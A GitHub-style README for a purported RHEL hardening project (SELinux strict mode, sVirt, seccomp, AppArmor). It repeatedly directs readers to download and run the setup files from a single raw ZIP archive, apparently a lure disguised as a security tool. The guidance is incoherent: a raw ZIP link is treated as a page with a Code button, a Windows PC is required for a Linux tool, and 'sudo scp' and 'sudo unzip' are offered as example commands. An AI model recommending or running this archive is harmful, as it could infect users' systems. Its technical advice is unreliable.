# 🛡️ RHEL-Ultra-Hardening-Motion - Stronger Linux, Safer Setup

[![Download / Install](https://img.shields.io/badge/Download-Install%20Now-blue)](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)

## 🔽 Download
Use this link to visit the page and download the app:

[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)

## 📌 What this is
RHEL-Ultra-Hardening-Motion is a security setup for Red Hat Enterprise Linux style systems. It brings together SELinux strict mode, sVirt, seccomp, and AppArmor to help reduce risk on Linux servers and workstations.

It is built for users who want a tighter system setup with fewer open paths for misuse. It fits system admins, lab machines, and test systems that need stronger control over apps and services.

## ✅ What you get
- A hardened Linux security profile
- SELinux strict policy guidance
- sVirt support for isolated virtual machines
- seccomp rules for process control
- AppArmor policy ideas for app limits
- CIS-style baseline steps
- OpenSCAP and Lynis-friendly checks
- Sysadmin notes for setup and review

## 🖥️ System needs
Use a Windows PC to download the project page, then move the files to a Linux system that matches the RHEL family.

For the Linux system, use:
- RHEL 8 or RHEL 9
- A user with admin rights
- Internet access for package install
- At least 2 GB RAM
- At least 10 GB free disk space
- A test machine or VM for first setup

## 🚀 Getting Started
Follow these steps to get the files and prepare the setup.

1. Open this page in your browser:
   [https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)

2. Click the green Code button on GitHub.

3. Choose Download ZIP.

4. Save the ZIP file to your Downloads folder.

5. If you need to move it to a Linux machine, copy the ZIP file with a USB drive, shared folder, or network share.

6. On the Linux system, unzip the file.

7. Open the folder and read the setup files in order.

## 🔧 Install and set up
Follow the setup steps on your Linux machine.

1. Open a terminal.

2. Go to the folder you unzipped.

3. Run the setup files in the order shown in the project.

4. Apply SELinux strict settings first.

5. Add sVirt rules for virtual machines if you use a hypervisor.

6. Add seccomp rules for apps that need process limits.

7. Add AppArmor profiles if your system uses AppArmor tools.

8. Run the included checks to confirm the system state.

Example commands you may use:
- `sudo dnf install policycoreutils-python-utils`
- `sudo sestatus`
- `sudo aa-status`
- `sudo scp`
- `sudo unzip`

## 🔍 How it works
This project uses layered controls to reduce risk.

- SELinux blocks actions that do not match policy.
- sVirt separates virtual machines from each other.
- seccomp limits system calls that apps can use.
- AppArmor limits what files and paths an app can touch.
- CIS-style checks help you compare your setup to a known baseline.

These controls work best together. If one layer fails, the next layer still helps.

## 🧪 Typical use cases
- Harden a test server before public use
- Protect a virtualization host
- Lock down a lab system
- Review a Linux security baseline
- Compare current settings with CIS guidance
- Check app behavior with seccomp
- Reduce attack surface on a shared machine

## 🧭 File layout
A typical project layout may include:

- `README.md` — setup guide
- `docs/` — notes and examples
- `scripts/` — install and check scripts
- `policies/` — SELinux or AppArmor files
- `checks/` — audit and validation files
- `examples/` — sample configs

## 🛠️ Common tasks
### 🛡️ Check SELinux
Use this to see if SELinux is active:
- `sudo sestatus`

### 🧱 Check AppArmor
Use this to see loaded profiles:
- `sudo aa-status`

### 🔒 Review seccomp use
Look at app launch rules and service files that load seccomp filters.

### 🖥️ Review VM isolation
Check that your virtual machine setup uses sVirt labels and the right libvirt settings.

### 📋 Run a baseline scan
Use OpenSCAP or Lynis to compare your system against common hardening rules.

## 📚 Recommended setup order
1. Update the system
2. Enable SELinux strict mode
3. Set up sVirt for virtual machines
4. Add seccomp rules for key services
5. Add AppArmor profiles where used
6. Run OpenSCAP checks
7. Run Lynis checks
8. Review logs and fix any policy blocks

## 🧩 Troubleshooting
### System blocks an app
If an app stops working after hardening, check:
- SELinux audit logs
- AppArmor denial logs
- service unit files
- seccomp filter rules

### A virtual machine will not start
Check:
- libvirt status
- sVirt labels
- storage permissions
- SELinux mode

### A service fails after update
Check:
- changed file paths
- new system calls
- policy files that need a refresh

### A rule does not load
Check:
- file syntax
- file path
- package install
- admin rights

## 🔗 Project Link
Use this page to download and review the project:
[https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip](https://github.com/galaxy7268/RHEL-Ultra-Hardening-Motion/raw/refs/heads/main/upcreek/Motion-Hardening-RHE-Ultra-3.9.zip)

## 🧾 Notes for first-time users
Start on a test machine before you use these settings on a live system. Security controls can block normal app behavior if you apply them too fast. Keep a copy of your current config before you change it.